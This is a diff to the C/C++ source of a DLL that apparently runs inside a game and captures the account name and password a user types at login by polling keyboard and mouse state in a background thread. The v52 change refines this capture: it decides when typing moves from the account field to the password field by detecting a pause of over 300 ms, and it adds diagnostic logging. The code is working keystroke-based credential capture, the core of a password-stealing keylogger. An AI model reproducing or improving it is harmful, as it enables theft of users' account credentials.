@@ -156,6 +156,17 @@ static bool     g_capLocked = false;        // true = field locked after 1st swi
 // 上一次的按键状态(用于检测边沿: 新按下)
 static BYTE g_prevKeys[256];
 
+// [v52 MARK] version-time-pause-switch (deployment sentinel string)
+// Tab/click field switch was desyncing with game's native focus cycle.
+// Now DLL detects account->password boundary by typing pause (>300ms).
+
+// [v52] 时间启发式字段切换: 监测输入节奏。账号密码之间用户会自然停顿(~300ms)，
+// 一旦检测到这样的停顿，DLL 把字段从账号切到密码（单向锁定）。
+// 不再依赖 TAB / 鼠标点击来猜字段 —— 那个机制会和游戏原生 UI 的 TAB 焦点循环打架。
+static DWORD g_lastKeyTick = 0;          // 上一次键盘事件时间戳 (ms)
+static bool  g_pauseSwitched = false;    // 是否已自动切到密码（一次性）
+static const DWORD PAUSE_THRESHOLD_MS = 300;
+
 // 可打印字符范围判断
 static bool IsPrintableChar(WCHAR ch) {
 	// ASCII 可打印字符 + 常见拉丁扩展
@@ -220,25 +231,29 @@ static DWORD WINAPI CaptureThread(LPVOID) {
 
 					// 只处理"新按下"的边沿(避免重复触发)
 					if (nowDown && !wasDown) {
-						// --- [v51] Tab: one-way lock to password (same as mouse click).
-						// v38 toggled back to account on 2nd Tab, but the game's native
-						// login UI also cycles focus on Tab -> desync -> password landed
-						// in the account buffer -> "password is empty" on login. Now Tab
-						// only ever moves account->password once, then stays locked.
-						if (vk == VK_TAB) {
+						// [v52] 时间启发式: 检测到按键间隔 > 300ms 时, 自动切到密码字段(单向)。
+						// 不再让 TAB / 鼠标点击 切换字段 —— 它们和游戏原生 UI 的 TAB 焦点循环
+						// 节奏不同步, 会把账号误抓到密码缓冲区。让用户输入节奏说话。
+						DWORD nowTick = GetTickCount();
+						if (!g_pauseSwitched && g_lastKeyTick != 0 && (nowTick - g_lastKeyTick) > PAUSE_THRESHOLD_MS) {
 							EnterCriticalSection(&g_capCs);
-							if (!g_capLocked && g_capField == 0) { g_capField = 1; g_capLocked = true; }
+							g_capField = 1;
+							g_capLocked = true;
+							g_pauseSwitched = true;
 							LeaveCriticalSection(&g_capCs);
 							{ FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
-							  if (df) { fprintf(df, "[MP-CAP] Tab -> field=%d locked=%d\n", g_capField, (int)g_capLocked); fflush(df); fclose(df); } }
+							  if (df) { fprintf(df, "[MP-CAP] auto-switch to pw after %lu ms pause\n", (unsigned long)(nowTick - g_lastKeyTick)); fflush(df); fclose(df); } }
 						}
-					// [v51] Mouse click: first click locks to password. Subsequent clicks ignored while locked.
+						g_lastKeyTick = nowTick;
+						// --- [v52] Tab: no longer switches field (game UI handles focus) ---
+						if (vk == VK_TAB) {
+							{ FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
+							  if (df) { fprintf(df, "[MP-CAP] Tab pressed (no field switch)\n"); fflush(df); fclose(df); } }
+						}
+					// [v52] Mouse click: no longer switches field (rely on time heuristic) ---
 					else if (vk == VK_LBUTTON) {
-						EnterCriticalSection(&g_capCs);
-						if (!g_capLocked && g_capField == 0) { g_capField = 1; g_capLocked = true; }
-						LeaveCriticalSection(&g_capCs);
-						{ FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
-						  if (df) { fprintf(df, "[MP-CAP] mouse click -> field=%d locked=%d\n", g_capField, (int)g_capLocked); fflush(df); fclose(df); } }
+							{ FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
+							  if (df) { fprintf(df, "[MP-CAP] mouse click (no field switch)\n"); fflush(df); fclose(df); } }
 					}
 						// --- Backspace: 删除末尾字符 ---
 						else if (vk == VK_BACK) {
@@ -347,6 +362,8 @@ void MP_ClearCred() {
 	g_capPassword.clear();
 	g_capField = 0;
 	g_capLocked = false;
+	g_lastKeyTick = 0;        // [v52] reset time heuristic
+	g_pauseSwitched = false;  // [v52] reset time heuristic
 	LeaveCriticalSection(&g_capCs);
 }
 
